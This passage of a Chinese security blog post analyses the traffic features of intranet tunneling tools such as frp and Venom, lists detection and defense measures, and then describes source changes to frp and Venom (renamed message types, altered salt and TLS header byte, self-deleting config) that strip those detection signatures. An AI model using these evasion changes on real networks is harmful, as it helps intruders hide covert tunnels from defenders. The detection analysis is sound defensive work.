<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220207165802108.png" alt="image-20220207165802108"></p>
<p>Neo-reGeog的流量报文</p>
<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220207165713749.png" alt="image-20220207165713749"></p>
<p><strong>ABPTTS</strong></p>
<p>abptts页面特征</p>
<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220207234557467.png" alt="image-20220207234557467"></p>
<p>查看报文特征</p>
<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220207235941114.png" alt="image-20220207235941114"></p>
<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220208000009857.png" alt="image-20220208000009857"></p>
<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220208000047328.png" alt="image-20220208000047328"></p>
<h2 id="0x03-检测与防御"><a href="#0x03-检测与防御" class="headerlink" title="0x03 检测与防御"></a>0x03 检测与防御</h2><h3 id="1、检测"><a href="#1、检测" class="headerlink" title="1、检测"></a>1、检测</h3><p>以frp作为案例</p>
<p>端口检测、进程检测、网络检测、文件检测、行为检测、流量检测、日志检测</p>
<p>端口检测：默认配置下，frp的服务端端口为7000</p>
<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220208183919257.png" alt="image-20220208183919257"></p>
<p>进程检测：从进程上看，frp的进程名称非常明显</p>
<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220208184104328.png" alt="image-20220208184104328"></p>
<p>流量检测：默认配置下，frp的建立连接过程和心跳维持过程都存在较为明显的特征。</p>
<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220205183254355.png" alt="image-20220205183254355"></p>
<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220205185013518.png" alt="image-20220205185013518"></p>
<p>添加tls加密后，frp在协商前存在0x17的协议头部特征</p>
<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220205205903524.png" alt="image-20220205205903524"></p>
<h3 id="2、防御"><a href="#2、防御" class="headerlink" title="2、防御"></a>2、防御</h3><p>针对服务器：<br>收敛出站权限（配置NAT、反向代理、统一内部DNS）</p>
<p>阻断恶意入站（部署企业级WAF）</p>
<p>针对办公机：<br>收拢协议<br>规范行为</p>
<h2 id="0x04-改造"><a href="#0x04-改造" class="headerlink" title="0x04 改造"></a>0x04 改造</h2><h3 id="1、frp改造"><a href="#1、frp改造" class="headerlink" title="1、frp改造"></a>1、frp改造</h3><h4 id="修改结构特征"><a href="#修改结构特征" class="headerlink" title="修改结构特征"></a>修改结构特征</h4><p>定位到frp\pkg\msg\msg.go文件，修改结构体中的特征</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Login\LoginResp\NewProxy\NewProxyResp\CloseProxy\NewWorkConn\StartWorkConn\NewVisitorConn</span><br><span class="line">NewVisitorConnResp\Ping\UDPPacket\NatHoleVisitor\NatHoleClient\NatHoleResp\NatHoleSid</span><br></pre></td></tr></table></figure>



<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220208113611284.png" alt="image-20220208113611284"></p>
<p>注意每个字段的一致性，特别是PrivilegeKey、Timestamp和RunID</p>
<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220208152703880.png" alt="image-20220208152703880"></p>
<p>定位到frp\pkg\util\version\version.go文件，修改版本特征</p>
<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220208113452941.png" alt="image-20220208113452941"></p>
<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220208113517879.png" alt="image-20220208113517879"></p>
<p>修改版本对比</p>
<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220208132131095.png" alt="image-20220208132131095"></p>
<p>测试</p>
<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220208152831354.png" alt="image-20220208152831354"></p>
<h4 id="修改默认加密salt"><a href="#修改默认加密salt" class="headerlink" title="修改默认加密salt"></a>修改默认加密salt</h4><p>修改服务端和客户端的默认salt</p>
<p>frp&#x2F;cmd&#x2F;frpc&#x2F;main.go</p>
<p>frp&#x2F;cmd&#x2F;frps&#x2F;main.go</p>
<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220208160524451.png" alt="image-20220208160524451"></p>
<h4 id="修改Tls协议0x17特征"><a href="#修改Tls协议0x17特征" class="headerlink" title="修改Tls协议0x17特征"></a>修改Tls协议0x17特征</h4><p>修改frp的tls协议中固定的0x17特征</p>
<p>frp&#x2F;pkg&#x2F;util&#x2F;net&#x2F;tls.go</p>
<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220208161350258.png" alt="image-20220208161350258"></p>
<h4 id="配置文件自删除"><a href="#配置文件自删除" class="headerlink" title="配置文件自删除"></a>配置文件自删除</h4><p>在frp&#x2F;cmd&#x2F;frpc&#x2F;sub&#x2F;root.go中，注册变量，在RegisterCommonFlags函数中注册参数，最后在startService运行检测函数中添加自删除操作</p>
<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220208203112314.png" alt="image-20220208203112314"></p>
<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220208203158361.png" alt="image-20220208203158361"></p>
<h3 id="2、Venom改造"><a href="#2、Venom改造" class="headerlink" title="2、Venom改造"></a>2、Venom改造</h3><p>venom的特征在于协议的数据分隔符和在端口重用时的鉴别符号，修改global&#x2F;global.go后，重新编译，即可实现特征隐藏。</p>
<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220208213244172.png" alt="image-20220208213244172"></p>
<p>改造后的venom，未进行加密情况下的报文信息中无原来的协议特征</p>
<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220208215056422.png" alt="image-20220208215056422"></p>
<h2 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h2><p>烽火台实验室-《内网代理工具与检测方法研究》</p>
<p>FreeBuf-kczwa1-《内网全局代理工具及特征分析》</p>
<p>天融信安全服务-《安全运营内刊｜检测与防护能力-隧道工具的使用与检测》</p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/firends/">Firends</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E7%8E%AF%E5%A2%83"><span class="toc-number">2.</span> <span class="toc-text">0x01 环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E5%88%86%E6%9E%90"><span class="toc-number">3.</span> <span class="toc-text">0x02 分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81ICMP%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF"><span class="toc-number">3.1.</span> <span class="toc-text">1、ICMP隧道技术</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81ICMP%E9%9A%A7%E9%81%93%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81"><span class="toc-number">3.2.</span> <span class="toc-text">2、ICMP隧道流量特征</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E3%80%81TCP%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF"><span class="toc-number">3.3.</span> <span class="toc-text">3、TCP隧道技术</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4%E3%80%81TCP%E9%9A%A7%E9%81%93%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81"><span class="toc-number">3.4.</span> <span class="toc-text">4、TCP隧道流量特征</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5%E3%80%81UDP%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF"><span class="toc-number">3.5.</span> <span class="toc-text">5、UDP隧道技术</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6%E3%80%81UDP%E9%9A%A7%E9%81%93%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81"><span class="toc-number">3.6.</span> <span class="toc-text">6、UDP隧道流量特征</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7%E3%80%81DNS%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF"><span class="toc-number">3.7.</span> <span class="toc-text">7、DNS隧道技术</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8%E3%80%81DNS%E9%9A%A7%E9%81%93%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81"><span class="toc-number">3.8.</span> <span class="toc-text">8、DNS隧道流量特征</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9%E3%80%81SSH%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF"><span class="toc-number">3.9.</span> <span class="toc-text">9、SSH隧道技术</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10%E3%80%81SSH%E9%9A%A7%E9%81%93%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81"><span class="toc-number">3.10.</span> <span class="toc-text">10、SSH隧道流量特征</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#11%E3%80%81HTTP%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF"><span class="toc-number">3.11.</span> <span class="toc-text">11、HTTP隧道技术</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#12%E3%80%81HTTP%E9%9A%A7%E9%81%93%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81"><span class="toc-number">3.12.</span> <span class="toc-text">12、HTTP隧道流量特征</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E6%A3%80%E6%B5%8B%E4%B8%8E%E9%98%B2%E5%BE%A1"><span class="toc-number">4.</span> <span class="toc-text">0x03 检测与防御</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81%E6%A3%80%E6%B5%8B"><span class="toc-number">4.1.</span> <span class="toc-text">1、检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81%E9%98%B2%E5%BE%A1"><span class="toc-number">4.2.</span> <span class="toc-text">2、防御</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-%E6%94%B9%E9%80%A0"><span class="toc-number">5.</span> <span class="toc-text">0x04 改造</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81frp%E6%94%B9%E9%80%A0"><span class="toc-number">5.1.</span> <span class="toc-text">1、frp改造</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9%E7%BB%93%E6%9E%84%E7%89%B9%E5%BE%81"><span class="toc-number">5.1.1.</span> <span class="toc-text">修改结构特征</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9%E9%BB%98%E8%AE%A4%E5%8A%A0%E5%AF%86salt"><span class="toc-number">5.1.2.</span> <span class="toc-text">修改默认加密salt</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9Tls%E5%8D%8F%E8%AE%AE0x17%E7%89%B9%E5%BE%81"><span class="toc-number">5.1.3.</span> <span class="toc-text">修改Tls协议0x17特征</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E8%87%AA%E5%88%A0%E9%99%A4"><span class="toc-number">5.1.4.</span> <span class="toc-text">配置文件自删除</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81Venom%E6%94%B9%E9%80%A0"><span class="toc-number">5.2.</span> <span class="toc-text">2、Venom改造</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-%E5%8F%82%E8%80%83"><span class="toc-number">6.</span> <span class="toc-text">0x05 参考</span></a></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://rj45mp.github.io/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://rj45mp.github.io/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/&text=内网代理和穿透工具的分析记录"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://rj45mp.github.io/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/&title=内网代理和穿透工具的分析记录"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://rj45mp.github.io/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/&is_video=false&description=内网代理和穿透工具的分析记录"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=内网代理和穿透工具的分析记录&body=Check out this article: https://rj45mp.github.io/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://rj45mp.github.io/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/&title=内网代理和穿透工具的分析记录"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://rj45mp.github.io/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/&title=内网代理和穿透工具的分析记录"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://rj45mp.github.io/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/&title=内网代理和穿透工具的分析记录"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://rj45mp.github.io/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/&title=内网代理和穿透工具的分析记录"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://rj45mp.github.io/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/&name=内网代理和穿透工具的分析记录&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://rj45mp.github.io/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/&t=内网代理和穿透工具的分析记录"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2019-2022
    Rj45mp
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/firends/">Firends</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->
 
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Umami Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
